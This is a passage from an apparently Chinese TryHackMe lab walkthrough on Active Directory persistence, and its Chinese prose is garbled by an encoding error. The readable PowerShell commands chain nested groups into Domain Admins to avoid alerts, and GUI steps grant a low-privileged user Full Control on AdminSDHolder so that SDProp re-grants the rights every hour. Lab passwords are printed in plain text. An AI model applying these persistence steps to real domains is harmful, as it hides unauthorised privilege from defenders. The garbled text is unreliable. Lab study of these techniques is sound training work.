åˆ°ADç»„ä¸­ä»¥å®ç°æŒä¹…åŒ–ã€‚è™½ç„¶ SID å†å²è®°å½•æ˜¯ä¸€ç§å¾ˆå¥½çš„æŒä¹…æ€§æŠ€æœ¯ï¼Œä½†å‡­è¯è½®æ¢å’Œæ¸…ç†ä»ç„¶å¯ä»¥æ¶ˆé™¤æˆ‘ä»¬çš„æŒä¹…æ€§ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé€šè¿‡é’ˆå¯¹ AD ç»„æœ¬èº«æ¥æ‰§è¡ŒæŒä¹…æ€§å¯èƒ½ä¼šæ›´å¥½ã€‚ é€šè¿‡å›¢ä½“æˆå‘˜èº«ä»½åšæŒä¸‹å» å¦‚ä»»åŠ¡1æ‰€è®¨è®ºçš„é‚£æ ·ï¼Œæœ€é«˜æƒé™çš„å¸æˆ·æˆ–ç»„å¹¶ä¸æ€»æ˜¯ç”¨äºæŒä¹…æ€§çš„æœ€ä½³é€‰æ‹©ã€‚æ¯”å…¶ä»–ç»„æ›´å¯†åˆ‡åœ°ç›‘è§†äº†ç‰¹æƒç»„çš„å˜åŒ–ã€‚ä»»ä½•è¢«å½’ç±»ä¸ºå—ä¿æŠ¤ç»„çš„ç»„ï¼Œä¾‹å¦‚åŸŸç®¡ç†å‘˜æˆ–ä¼ä¸šç®¡ç†å‘˜ï¼Œéƒ½ä¼šæ¥å—é¢å¤–çš„å®‰å…¨å®¡æŸ¥ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æƒ³é€šè¿‡ç»„æˆå‘˜èº«ä»½æŒä¹…å­˜åœ¨ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åœ¨å°†æˆ‘ä»¬è‡ªå·±çš„å¸æˆ·æ·»åŠ åˆ°æŒä¹…æ€§çš„ç»„æ—¶è¿›è¡Œåˆ›é€ æ€§çš„è€ƒè™‘ï¼š IT Supportç»„å¯ç”¨äºè·å–è¯¸å¦‚å¼ºåˆ¶æ›´æ”¹ç”¨æˆ·å¯†ç ä¹‹ç±»çš„ç‰¹æ®Šæƒé™ï¼Œå°½ç®¡åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½æ— æ³•é‡ç½®ç‰¹æƒç”¨æˆ·çš„å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½å¤Ÿå°è¯•é‡ç½®ä½ç‰¹æƒç”¨æˆ·çš„å¯†ç å¹¶ç»§ç»­å°†è®¿é—®æƒé™æ‰©å±•åˆ°ç›®æ ‡å·¥ä½œç«™ã€‚ ç›®æ ‡åŸŸç½‘ç»œæ‰€æä¾›çš„å…·æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™çš„ç»„é€šå¸¸ä¸ä¼šåƒè¢«ä¿æŠ¤ç»„é‚£æ ·è¢«å¯†åˆ‡ç›‘æ§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ç»„æˆå‘˜å…³ç³»ï¼Œæ¥æ‹¥æœ‰å¯¹ç›®æ ‡ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚ æ­¤ç±»æƒé™ç»´æŒæŠ€æœ¯å¹¶ä¸æ€»æ˜¯ä¸ç›´æ¥çš„ç‰¹æƒæœ‰å…³ï¼Œæœ‰æ—¶ï¼Œå…·æœ‰é—´æ¥ç‰¹æƒ(ä¾‹å¦‚å¯¹ç»„ç­–ç•¥å¯¹è±¡çš„æ‰€æœ‰æƒ)çš„ç»„ä¹ŸåŒæ ·é€‚åˆæˆ‘ä»¬ç”¨æ¥å®ç°æƒé™ç»´æŒã€‚ Nested Groups(åµŒå¥—ç»„) åœ¨å¤§å¤šæ•°ä¼ä¸šç½‘ç»œç¯å¢ƒä¸­ï¼Œéƒ½å­˜åœ¨å¤§é‡çš„é€’å½’ç»„ã€‚é€’å½’ç»„æ˜¯æŒ‡æŸä¸ªç»„æ˜¯å¦ä¸€ä¸ªç»„çš„æˆå‘˜ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿™æ˜¯ç»„åµŒå¥—(group nesting)ï¼Œè¿™ç§ç»„åµŒå¥—å¯ç”¨äºåœ¨ADåŸŸç½‘ç»œä¸­åˆ›å»ºæ›´æœ‰ç»„ç»‡æ€§çš„ç»“æ„ã€‚ ä»¥IT Support(æŠ€æœ¯æ”¯æŒ)ç»„ä¸ºä¾‹ï¼ŒIT Supportæ˜¯ä¸€ä¸ªé€šç”¨çš„ç»„ï¼Œå› æ­¤ï¼Œåœ¨è¿™ä¸ªç»„ä¸‹é¢å¯èƒ½ä¼šæœ‰åƒHelpdeskã€Access Card Managerså’ŒNetwork Managersè¿™æ ·çš„å­ç»„ï¼›æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰è¿™äº›ç»„ä½œä¸ºæˆå‘˜æ·»åŠ åˆ°IT Supportç»„ä¸­ï¼Œè¿™å°†ä¸ºå­ç»„ä¸­çš„æ‰€æœ‰ç”¨æˆ·åˆ†é…ä¸IT Supportç»„ç›¸å…³è”çš„æƒé™å’Œç‰¹æƒï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥ä¸ºæ¯ä¸ªå­ç»„åˆ†é…æ›´ç»†è‡´çš„æƒé™å’Œç‰¹æƒã€‚ è™½ç„¶ç»„åµŒå¥—æœ‰åŠ©äºç»„ç»‡ADåŸŸç½‘ç»œï¼Œä½†æ˜¯å®ƒç¡®å®é™ä½äº†å…³äºé‚£äº›å…·æœ‰æœ‰æ•ˆè®¿é—®æƒé™çš„ADå¸æˆ·çš„å¯è§æ€§ã€‚å†æ¬¡ä»¥IT Supportç»„ä¸ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬å‘ADåŸŸæŸ¥è¯¢IT Supportç»„çš„æˆå‘˜ï¼Œå®ƒå¯èƒ½ä¼šå‘Šè¯‰æˆ‘ä»¬è¯¥ç»„æœ‰ä¸‰ä¸ªæˆå‘˜ï¼Œç„¶è€Œï¼Œè¿™ä¸ªæ•°å­—å¹¶ä¸çœŸå®ï¼Œå› ä¸ºIT Supportç»„ä¸­çš„ä¸‰ä¸ªæˆå‘˜ä¹Ÿå¯ä»¥æ˜¯ç»„ã€‚ä¸ºäº†æ›´å……åˆ†åœ°äº†è§£å…·æœ‰æœ‰æ•ˆè®¿é—®æƒé™çš„å¸æˆ·æ•°é‡ï¼Œæˆ‘ä»¬è¿˜å¿…é¡»ç»§ç»­æšä¸¾IT Supportç»„ä¸­çš„å­ç»„ï¼Œä½†æ˜¯è¿™äº›å­ç»„æœ¬èº«ä¹Ÿå¯ä»¥æœ‰å­ç»„ä½œä¸ºæˆå‘˜ã€‚é‚£ä¹ˆé—®é¢˜æœ€ç»ˆå°±å˜æˆäº†:â€œæˆ‘ä»¬åº”è¯¥æšä¸¾å¤šå°‘å±‚ï¼Œæ‰èƒ½å¾—åˆ°çœŸæ­£çš„å…·æœ‰æœ‰æ•ˆè®¿é—®æƒé™çš„ADå¸æˆ·æ•°ç›®?â€(è¿™é‡Œçš„æœ‰æ•ˆè®¿é—®æƒé™æ˜¯æŒ‡ç”±äºç»„æˆå‘˜å…³ç³»è€Œåˆ†é…ç»™æŸä¸ªADå¸æˆ·çš„æƒé™) å¤šå±‚ç»„åµŒå¥—å…³ç³»ä¹Ÿä¼šè®©è“é˜Ÿæ›´åŠ éš¾ä»¥ç›‘æ§æƒé™åˆ†é…æƒ…å†µï¼Œå‡è®¾å½“ä¸€ä¸ªæ–°æˆå‘˜è¢«æ·»åŠ åˆ°Domain Adminsç»„æ—¶ä¼šå‘è“é˜Ÿå‘å‡ºè­¦æŠ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è­¦æŠ¥ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…å°†ç”¨æˆ·æ·»åŠ åˆ°Domain Adminsç»„ä¸­çš„å­ç»„ä¸­ï¼Œåˆ™å¯èƒ½å¹¶ä¸ä¼šè§¦å‘è¯¥è­¦æŠ¥ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„é—®é¢˜ï¼Œå› ä¸ºADæ˜¯ç”±ADå›¢é˜Ÿç®¡ç†çš„ï¼Œè€Œè­¦æŠ¥å’Œç›‘æ§åˆ™æ˜¯ç”±InfoSec(ä¿¡æ¯å®‰å…¨)å›¢é˜Ÿç®¡ç†çš„ï¼›æˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…æ‰€éœ€è¦çš„æ˜¯ä»¥ä¸Šä¸¤ä¸ªå›¢é˜Ÿä¹‹é—´å­˜åœ¨ä¸€äº›æ²Ÿé€šä¸Šçš„é”™è¯¯ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä½¿ç”¨å­ç»„è¿›è¡Œç”¨æˆ·æ·»åŠ æ—¶ï¼Œå°±ä¸ä¼šæœ‰è­¦æŠ¥æ¶ˆæ¯è¢«å‘é€ç»™è“é˜Ÿã€‚ ä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§è¢«é™ä½çš„æƒé™åˆ†é…å¯è§æ€§æ¥å°è¯•æ‰§è¡Œæƒé™ç»´æŒæ“ä½œã€‚æˆ‘ä»¬å¯ä»¥ä¸å°†ç›®æ ‡ç›´æ¥é”å®šåœ¨é‚£äº›èƒ½è®©æˆ‘ä»¬è®¿é—®ADåŸŸçš„ç‰¹æƒç»„ä¸Šï¼Œè€Œæ˜¯è½¬è€ŒæŠŠæ³¨æ„åŠ›é›†ä¸­åœ¨å­ç»„ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šæˆ‘ä»¬ä¸æ·»åŠ ç›´æ¥æ–°æˆå‘˜åˆ°é‚£äº›å¯èƒ½ä¼šå‘è“é˜Ÿå‘å‡ºè­¦æŠ¥çš„ç‰¹æƒç»„ä¸­ï¼Œè€Œæ˜¯å°†ä½æƒé™çš„ç”¨æˆ·æ·»åŠ åˆ°å¯èƒ½æœªè¢«ç›‘æ§çš„é‚£äº›å­ç»„ä¸­ã€‚ åŸºäºåµŒå¥—ç»„å®ç°æƒé™ç»´æŒ æˆ‘ä»¬é¦–å…ˆä½¿ç”¨administratorå¸æˆ·é€šè¿‡SSHç™»å½•åˆ°è·³æ¿ä¸»æœºï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„åŸºç¡€ç»„ï¼Œå¹¶ä¸”å°†è¯¥ç»„éšè—åœ¨People-&gt;IT OU(ç»„ç»‡å•å…ƒ)ä¸­ï¼š PS C:\\Users\\Administrator.ZA&gt;New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 1\" -SamAccountName \"hybcx_nestgroup1\" -DisplayName \"hybcx Nest Group 1\" -GroupScope Global -GroupCategory Security ç„¶åè®©æˆ‘ä»¬åœ¨People-&gt;Sales OU(ç»„ç»‡å•å…ƒ)ä¸­åˆ›å»ºå¦ä¸€ä¸ªç»„ï¼Œå¹¶ä¸”å°†æˆ‘ä»¬åˆšæ‰çš„åŸºç¡€ç»„ä½œä¸ºç»„æˆå‘˜æ·»åŠ è¿›æ¥ï¼š PS C:\\Users\\Administrator.ZA&gt;New-ADGroup -Path \"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 2\" -SamAccountName \"hybcx_nestgroup2\" -DisplayName \"hybcx Nest Group 2\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt;Add-ADGroupMember -Identity \"hybcx_nestgroup2\" -Members \"hybcx_nestgroup1\" æˆ‘ä»¬é‡å¤æ‰§è¡Œå‡ æ¬¡ä¸Šè¿°ä¸¤ä¸ªæ­¥éª¤ï¼Œæ¯æ¬¡éƒ½å°†å‰ä¸€ä¸ªç»„æ·»åŠ ä¸ºæ–°çš„ç»„çš„æˆå‘˜ï¼š PS C:\\Users\\Administrator.ZA&gt; New-ADGroup -Path \"OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 3\" -SamAccountName \"hybcx_nestgroup3\" -DisplayName \"hybcx Nest Group 3\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"hybcx_nestgroup3\" -Members \"hybcx_nestgroup2\" PS C:\\Users\\Administrator.ZA&gt; New-ADGroup -Path \"OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 4\" -SamAccountName \"hybcx_nestgroup4\" -DisplayName \"hybcx Nest Group 4\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"hybcx_nestgroup4\" -Members \"hybcx_nestgroup3\" PS C:\\Users\\Administrator.ZA&gt; New-ADGroup -Path \"OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 5\" -SamAccountName \"hybcx_nestgroup5\" -DisplayName \"hybcx Nest Group 5\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"hybcx_nestgroup5\" -Members \"hybcx_nestgroup4\" #ä¸Šè¿°ç»„åè‡ªå®šä¹‰å³å¯ ç°åœ¨è®©æˆ‘ä»¬å°†ä¸Šè¿°æ‰€åˆ›å»ºçš„æœ€åä¸€ä¸ªç»„æ·»åŠ åˆ°åŸŸç®¡ç†å‘˜ç»„ï¼š PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"Domain Admins\" -Members \"hybcx_nestgroup5\" æœ€åï¼Œæˆ‘ä»¬å°†ä½æƒé™çš„ADç”¨æˆ·æ·»åŠ åˆ°æˆ‘ä»¬å…ˆå‰æ‰€åˆ›å»ºçš„ç¬¬ä¸€ä¸ªç»„ä¸­ï¼š #PS C:\\Users\\Administrator.ZA&gt;Add-ADGroupMember -Identity \"hybcx_nestgroup1\" -Members \"&lt;low privileged username&gt;\" PS C:\\Users\\Administrator.ZA&gt;Add-ADGroupMember -Identity \"hybcx_nestgroup1\" -Members \"louis.cole\" å®Œæˆä¸Šè¿°æ“ä½œä¹‹åï¼Œæˆ‘ä»¬çš„ä½æƒé™ADç”¨æˆ·å°†è·å¾—é’ˆå¯¹THMDC(ç›®æ ‡åŸŸæ§)æœºå™¨çš„è®¿é—®ç‰¹æƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥ä½æƒé™ç”¨æˆ·é€šè¿‡SSHè®¿é—®THMWRK1è·³æ¿ä¸»æœºå¹¶æ‰§è¡Œç›¸å…³å‘½ä»¤æ¥éªŒè¯è¿™ä¸€ç‚¹ï¼š za\\chloe.potter@THMWRK1 C:\\Users\\chloe.potter&gt;dir \\\\thmdc.za.tryhackme.loc\\c$\\ Volume in drive \\\\thmdc.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\thmdc.za.tryhackme.loc\\c$ 01/04/2022 07:47 AM 103 delete-vagrant-user.ps1 05/01/2022 08:11 AM 169 dns_entries.csv 09/15/2018 07:19 AM &lt;DIR&gt; PerfLogs 05/11/2022 09:32 AM &lt;DIR&gt; Program Files 03/21/2020 08:28 PM &lt;DIR&gt; Program Files (x86) 07/03/2022 05:05 PM 7,168 shell.exe 05/01/2022 08:17 AM 1,725 thm-network-setup-dc.ps1 07/06/2022 03:38 PM &lt;DIR&gt; tmp 06/30/2022 01:58 PM &lt;DIR&gt; Tools 02/28/2024 10:29 PM &lt;DIR&gt; Users 04/25/2022 06:11 PM &lt;SYMLINKD&gt; vagrant [\\\\vboxsvr\\vagrant] 07/03/2022 08:51 AM &lt;DIR&gt; Windows 4 File(s) 9,165 bytes 8 Dir(s) 51,539,042,304 bytes free å›åˆ°æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨administratorå¸æˆ·æ‰€å»ºç«‹çš„SSHä¼šè¯ç•Œé¢ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥éªŒè¯ä¸€ä¸‹ï¼Œå³ä½¿æˆ‘ä»¬åˆ›å»ºäº†å¤šä¸ªç»„ï¼ŒåŸŸç®¡ç†å‘˜ç»„ä¹Ÿåªæœ‰ä¸€ä¸ªæ–°æˆå‘˜ï¼š PS C:\\Users\\Administrator.ZA&gt; Get-ADGroupMember -Identity \"Domain Admins\" distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc name : Administrator objectClass : user objectGUID : 0bbd7980-b53b-4634-8a28-57e4234655c2 SamAccountName : Administrator SID : S-1-5-21-3885271727-2693558621-2658995185-500 distinguishedName : CN=matthew.williams,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC= loc name : matthew.williams objectClass : user objectGUID : c4f5743a-c362-49c5-b95c-5ec2a33bf480 SamAccountName : matthew.williams SID : S-1-5-21-3885271727-2693558621-2658995185-1114 distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : Am0 Net Group 5 objectClass : group objectGUID : ba545574-6af9-4a3d-a8df-24ab582fc04c SamAccountName : am0_nestgroup5 SID : S-1-5-21-3885271727-2693558621-2658995185-6163 distinguishedName : CN=timtaylor Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : timtaylor Net Group 5 objectClass : group objectGUID : c7df8bd5-d8ed-44a6-9ec2-375935db3c83 SamAccountName : timtaylor_nestgroup5 SID : S-1-5-21-3885271727-2693558621-2658995185-6168 distinguishedName : CN=hybcx Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : hybcx Net Group 5 objectClass : group objectGUID : bcf18156-2091-4b3d-89cc-fefae53893fd SamAccountName : hybcx_nestgroup5 SID : S-1-5-21-3885271727-2693558621-2658995185-6610 è™½ç„¶è¿™é‡Œå¾ˆå¤šç»„æˆå‘˜ï¼Œä½†è¿™æ˜¯ç”±äºè¿™ä¸ªé¶æœºæ˜¯å…±äº«çš„ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨ä¹‹ä¸­çš„hybcx Net Group 5åªæœ‰è¿™ä¸€ä¸ª çƒ¦äººçš„ä¸ä»…ä»…æ˜¯è“é˜Ÿ å¦‚æœæ˜¯åœ¨ç°å®çš„ä¼ä¸šç½‘ç»œç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¸å¿…åˆ›å»ºæ–°çš„ç»„æ¥è¿›è¡Œç»„åµŒå¥—ï¼Œå®é™…ä¸Šï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨ç°æœ‰çš„ç»„æ¥æ‰§è¡Œç»„åµŒå¥—æ“ä½œï¼›ç„¶è€Œï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨æ­£å¸¸çš„çº¢é˜Ÿè¯„ä¼°è¡ŒåŠ¨ä¸­æ°¸è¿œä¸ä¼šåšçš„äº‹æƒ…ï¼Œå› ä¸ºè¿™ç§ç»„åµŒå¥—æ“ä½œä¼šç ´åä¼ä¸šç»„ç»‡çš„ADåŸŸç½‘ç»œç»“æ„ï¼Œå¦‚æœè¿™ç§ç ´åè¶³å¤Ÿå……åˆ†ï¼Œé‚£ä¹ˆADåŸŸç½‘ç»œç»“æ„å°†æ— æ³•æ¢å¤ã€‚ è¿™æ„å‘³ç€ï¼šå³ä½¿è“é˜Ÿèƒ½å¤Ÿå°†æˆ‘ä»¬æ‰€è·å¾—çš„æƒé™å–æ¶ˆï¼Œä¼ä¸šç»„ç»‡ä¹Ÿå¾ˆå¯èƒ½éœ€è¦ä»å¤´å¼€å§‹é‡å»ºä»–ä»¬çš„æ•´ä¸ªADç½‘ç»œç»“æ„ï¼Œè¿™å°†ä¼šé€ æˆä¼ä¸šçš„é‡å¤§æŸå¤±ã€‚ 0x07 é€šè¿‡ACLè¿›è¡ŒæŒä¹…åŒ– æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¸ä»…ä»…æƒ³è¦é€šè¿‡æ­£å¸¸çš„ADç»„æ¥å®ç°æƒé™ç»´æŒï¼Œè€Œæ˜¯å¸Œæœ›åŸºäºæ‰€æœ‰å—ä¿æŠ¤çš„ç»„æ¥è¿›è¡Œæƒé™ç»´æŒã€‚ ä½¿ç”¨ADç»„æ¨¡æ¿ è™½ç„¶æˆ‘ä»¬å¯ä»¥å‘æˆ‘ä»¬æ‰€èƒ½æ‰¾åˆ°çš„æ¯ä¸ªç‰¹æƒç»„æ·»åŠ ä¸€ä¸ªå—æˆ‘ä»¬æ§åˆ¶çš„ADå¸æˆ·ï¼Œä½†æ˜¯è“é˜Ÿä»ç„¶å¯ä»¥æ‰§è¡Œç›¸å…³çš„æ¸…ç†æ“ä½œå¹¶åˆ é™¤æˆ‘ä»¬æ‰€æ·»åŠ çš„ç»„æˆå‘˜ã€‚ä¸ºäº†ç¡®ä¿æ›´å¥½è¿›è¡Œæƒé™ç»´æŒï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥æ¨¡æ¿ä»¥ç”Ÿæˆé»˜è®¤ç»„ï¼Œé€šè¿‡å¯¹è¿™äº›æ¨¡æ¿æ‰§è¡Œæ³¨å…¥æ“ä½œï¼Œå³ä½¿è“é˜Ÿåˆ é™¤äº†æˆ‘ä»¬æ‰€æ·»åŠ çš„ç»„æˆå‘˜ï¼Œæˆ‘ä»¬ä¹Ÿåªéœ€è¦ç­‰å¾…æ¨¡æ¿åˆ·æ–°ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½å†æ¬¡è®©æˆ‘ä»¬æ‰€æ§åˆ¶çš„ADå¸æˆ·è·å¾—ç»„æˆå‘˜èµ„æ ¼ã€‚ ä¸€ä¸ªæˆ‘ä»¬å¯ç”¨çš„æ¨¡æ¿æ˜¯AdminSDHolderå®¹å™¨ã€‚è¯¥å®¹å™¨å­˜åœ¨äºæ¯ä¸ªADåŸŸä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä»¥å…¶ACL(Access Control List-è®¿é—®æ§åˆ¶åˆ—è¡¨)ä¸ºæ¨¡æ¿ï¼Œä»è€Œå°†æƒé™å¤åˆ¶åˆ°æ‰€æœ‰çš„å—ä¿æŠ¤ç»„ä¸­ã€‚å¸¸è§çš„å—ä¿æŠ¤ç»„åŒ…æ‹¬Domain Adminsã€Administratorsã€Enterprise Adminsã€Schema Adminsç­‰ç‰¹æƒç»„ã€‚å¦‚æœæƒ³è¦æŸ¥çœ‹å…³äºå—ä¿æŠ¤ç»„çš„å®Œæ•´åˆ—è¡¨ï¼Œå¯ä»¥è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼š https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10) ä¸€ä¸ªåä¸ºSDPropçš„è¿›ç¨‹èƒ½å¤Ÿè·å–AdminSDHolderå®¹å™¨çš„ACLï¼Œå¹¶å¯ä»¥æ¯60åˆ†é’Ÿå°†å…¶åº”ç”¨äºæ‰€æœ‰å—ä¿æŠ¤ç»„ï¼›å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºæ­¤è¿›ç¨‹ç¼–å†™ä¸€ä¸ªACE(è®¿é—®æ§åˆ¶æ¡ç›®)ï¼Œå®ƒå°†æˆäºˆæˆ‘ä»¬å¯¹äºæ‰€æœ‰å—ä¿æŠ¤ç»„çš„å®Œå…¨æƒé™ã€‚å¦‚æœè“é˜Ÿæ²¡æœ‰æ„è¯†åˆ°è¿™ç§ç±»å‹çš„æƒé™ç»´æŒæŠ€æœ¯æ­£åœ¨è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆä»–ä»¬å°†å¾ˆéš¾å®Œå…¨æ¸…é™¤æ”»å‡»è€…æ‰€è·å¾—çš„æƒé™ã€‚å› ä¸ºï¼Œå³ä½¿è“é˜Ÿåˆ é™¤äº†é‚£äº›åŸºäºå—ä¿æŠ¤å¯¹è±¡æˆ–è€…ç»„çš„ä¸æ°å½“çš„æƒé™ä¹‹åï¼Œç›¸å…³çš„æƒé™ä»ç„¶ä¼šåœ¨ä¸€ä¸ªå°æ—¶å†…è¢«é‡æ–°åˆ†é…ã€‚ç”±äºè¿™ç§é‡æ–°æˆæƒæ˜¯é€šè¿‡æ­£å¸¸çš„ADè¿‡ç¨‹æ¥è¿›è¡Œçš„ï¼Œå› æ­¤è¿™ç§æ“ä½œä¹Ÿä¸ä¼šè®©è“é˜Ÿæ”¶åˆ°ä»»ä½•è­¦æŠ¥æç¤ºï¼Œè¿™ä¼šè®©è“é˜Ÿæ›´åŠ éš¾ä»¥ç¡®å®šè¿™ç§æŒä¹…åŒ–æƒé™çš„æ¥æºã€‚ ä½¿ç”¨AdminSDHolderå®¹å™¨(ä¿®æ”¹å…¶ACLs)å®ç°æƒé™ç»´æŒ ä¸ºäº†åŸºäºAdminSDHolderå®¹å™¨æ¥è¿›è¡Œæƒé™ç»´æŒæ“ä½œï¼Œæˆ‘ä»¬è¿˜å°†ä½¿ç”¨Microsoftç®¡ç†æ§åˆ¶å°(MMC-Microsoft Management Console)ã€‚æˆ‘ä»¬é¦–å…ˆä¼šä½¿ç”¨ä¸Šæ–‡æ‰€æåŠçš„ä½æƒé™çš„ADå¸æˆ·æ¥é€šè¿‡RDPè®¿é—®è·³æ¿ä¸»æœºTHMWRK1ï¼Œç„¶ååœ¨è·³æ¿æœºçš„ç»ˆç«¯ä¸­ä½¿ç”¨runaså‘½ä»¤æ³¨å…¥ç®¡ç†å‘˜å‡­æ®åˆ°å½“å‰ä¼šè¯ä¸­å¹¶å¯åŠ¨å¦ä¸€ä¸ªç»ˆç«¯ç¨‹åºï¼Œæœ€åæˆ‘ä»¬å°†ä»æ­¤æ–°ç»ˆç«¯å¯åŠ¨MMCï¼š xfreerdp /d:za.tryhackme.loc /u:'grace.clarke' /p:'Password1' /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard C:\\Users\\chloe.potter&gt; runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe #Password:tryhackmewouldnotguess1@ #åœ¨æ–°ç»ˆç«¯ç•Œé¢ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ C:\\Windows\\system32&gt; mmc.exe #è¿™èƒ½è®©æˆ‘ä»¬ä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½æˆåŠŸè®¿é—®åˆ°åŸŸæ§åˆ¶å™¨ä¸Šçš„MMCæ§åˆ¶å° æˆåŠŸæ‰“å¼€MMCçª—å£ä¹‹åï¼Œæˆ‘ä»¬å‘å…¶æ·»åŠ â€œUsers and Groupsç”¨æˆ·å’Œç»„â€ç®¡ç†å•å…ƒ(File-&gt;Add/Remove Snap-in-&gt;Active Directory Users and Computers)ï¼Œå¹¶ä¸”é€‰ä¸­ç›®æ ‡åŸŸä»¥å¯ç”¨é«˜çº§åŠŸèƒ½(View-&gt;Advanced Features)ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨Domain-&gt;Systemä¸‹é¢æ‰¾åˆ°AdminSDHolderç»„ï¼š æˆ‘ä»¬ç»§ç»­å¯¼èˆªåˆ°è¯¥ç»„çš„Security å±æ€§(å³é”®å•å‡»AdminSDHolder-&gt;Properties-&gt;Security)ï¼š è®©æˆ‘ä»¬åœ¨ä¸Šè¿°ç•Œé¢ä¸­æ·»åŠ æˆ‘ä»¬æ‰€æ§åˆ¶çš„ä½æƒé™ADç”¨æˆ·ï¼Œå¹¶ä¸”æˆäºˆå…¶å®Œå…¨æ§åˆ¶(Full Control)æƒé™ï¼š ç‚¹å‡»Add(æ·»åŠ )ã€‚ æœç´¢æˆ‘ä»¬æ‰€èƒ½ä½¿ç”¨çš„ä½æƒé™ADç”¨æˆ·åç§°(ä¾‹å¦‚chloe.potter)ï¼Œç„¶åç‚¹å‡»Check Names(æ£€æŸ¥åç§°)ã€‚ ç‚¹å‡»OKã€‚ é€‰æ‹©Full Control(å®Œå…¨æ§åˆ¶)å¹¶ç‚¹å‡»Allow(å…è®¸)ã€‚ ç‚¹å‡»Apply(åº”ç”¨)ã€‚ ç‚¹å‡»OKã€‚ æ·»åŠ æˆåŠŸä¹‹åï¼Œå…·ä½“ç»“æœå°†å¦‚ä¸‹æ‰€ç¤ºï¼š æ‰‹åŠ¨å¯åŠ¨SDPropè¿›ç¨‹ æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ç­‰å¾…60åˆ†é’Ÿï¼Œç„¶åæˆ‘ä»¬æ‰€æ·»åŠ çš„ä½æƒé™ç”¨æˆ·å°†èƒ½å¤Ÿå®Œå…¨æ§åˆ¶æ‰€æœ‰çš„å—ä¿æŠ¤ç»„ã€‚è¿™æ˜¯å› ä¸ºå®‰å…¨æè¿°ç¬¦ä¼ æ’­å™¨(SDProp)æœåŠ¡æ¯60åˆ†é’Ÿä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å®ƒä¼šå°†æˆ‘ä»¬æ‰€æ›´æ”¹çš„ACL(è®¿é—®æ§åˆ¶åˆ—è¡¨)ä¼ æ’­åˆ°æ‰€æœ‰çš„å—ä¿æŠ¤ç»„ã€‚ tipsï¼šSDPropçš„å…¨ç§°ä¸ºSecurity Descriptor Propagator(å®‰å…¨æè¿°ç¬¦ä¼ æ’­å™¨)ã€‚ 